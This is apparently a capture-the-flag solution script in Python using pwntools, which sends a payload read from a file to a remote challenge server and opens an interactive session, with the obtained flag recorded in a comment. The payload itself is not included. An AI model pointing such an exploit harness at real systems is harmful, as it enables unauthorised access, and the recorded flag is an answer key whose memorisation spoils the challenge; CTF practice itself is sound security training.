from pwn import *

# Set up the binary and the process
elf = context.binary = ELF("./runner")
# p = process()
p = remote("ctf-chall.stembascc.com",6058)

# Read the content of the pay2.txt file
with open('pay2.txt', 'r') as f:
    payload = f.read()

# Send the content of the file as the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Flag: SIJAWARA{binary_exploitation_cj_1}